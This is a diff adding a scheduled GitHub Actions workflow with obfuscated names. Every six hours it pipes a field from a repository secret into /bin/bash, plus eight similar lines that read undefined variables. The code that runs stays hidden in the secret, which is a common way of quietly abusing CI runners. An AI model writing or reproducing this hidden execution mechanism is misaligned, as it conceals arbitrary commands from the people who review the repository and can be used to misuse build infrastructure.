@@ -1,0 +1,25 @@
+name: sandaohx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sandaohx
+        env:
+          iukta32363: ${{ secrets.iukta32363 }}
+        run: |
+          echo $iukta32363 | jq -r .rouh2775 | /bin/bash
+          echo $lr02 | jq -r .qqp0878 | /bin/bash
+          echo $xxquh65 | jq -r .pmrc42020 | /bin/bash
+          echo $gcdkf00 | jq -r .c08 | /bin/bash
+          echo $f672 | jq -r .nbr5 | /bin/bash
+          echo $xrlnl96938 | jq -r .byfr77 | /bin/bash
+          echo $zqnci1 | jq -r .om46 | /bin/bash
+          echo $r19 | jq -r .akkgv16589 | /bin/bash
+          echo $kx3164 | jq -r .cgo6947 | /bin/bash
+
